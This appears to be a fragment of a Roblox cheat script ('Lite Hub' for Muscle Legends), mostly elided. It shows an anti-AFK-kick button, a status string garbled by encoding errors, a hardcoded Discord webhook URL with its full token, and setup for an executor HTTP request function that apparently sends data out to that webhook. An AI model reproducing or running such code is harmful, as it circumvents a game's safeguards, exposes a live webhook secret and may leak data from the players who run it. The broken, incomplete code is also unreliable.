...
local window = library:AddWindow("Lite Hub Muscle Legends [] Free Version v1.1", {
...
Maintab:AddButton("Anti Crash", function()
    ...
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        ...
        ab.Text = "Roblox tried kicking you, but I didnÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢t let them!"  -- Fixed encoding issue
        wait(2)
        ab.Text = "Status: Active"
    end)
end)
...
local webhook_url = "https://discord.com/api/webhooks/1325051507036389487/JE9gqrwcTVNKloIHZHvpkUniwlYzYadMnC1-oasTS5V2hhNdbZUo8ihSZNIPJU2dGeMw"
...
-- Adding the labels-- syn request cuz sigma
local req = http_request or request or (syn and syn.request)
